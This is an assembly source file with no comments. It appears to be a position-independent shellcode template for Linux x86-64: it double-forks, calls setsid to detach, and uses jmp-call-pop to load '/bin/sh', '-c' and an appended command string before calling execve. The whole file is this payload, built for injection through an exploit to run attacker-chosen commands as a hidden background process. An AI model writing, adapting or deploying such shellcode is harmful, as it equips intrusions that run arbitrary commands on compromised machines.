#include <sys/syscall.h>

#define BINSH "/bin/sh\x00"
#define TACC "-c\x00\x00\x00\x00\x00\x00"

.intel_syntax noprefix
.globl main
.type main, @function

main:
    mov rax, SYS_fork
    syscall
    cmp rax, 1
    jl setsid
    xor rdi, rdi
    mov rax, SYS_exit
    syscall

setsid:
    mov rax, SYS_setsid
    syscall
    mov rax, SYS_fork
    syscall
    cmp rax, 1
    jl forkexit
    xor rdi, rdi
    mov rax, SYS_exit
    syscall

forkexit:
    jmp pop_binsh

ret1:
    pop rdi
    jmp pop_tacc

ret2:
    pop rcx
    jmp pop_userinput

ret3:
    pop r10

binsh:
    xor rax, rax
    push rax
    push r10
    push rcx
    push rdi
    mov rsi, rsp
    xor rdx, rdx
    mov rax, SYS_execve
    syscall

exit:
    xor rdi, rdi
    mov rax, SYS_exit
    syscall

pop_binsh:
    call ret1
    .string BINSH

pop_tacc:
    call ret2
    .string TACC

pop_userinput:
    call ret3
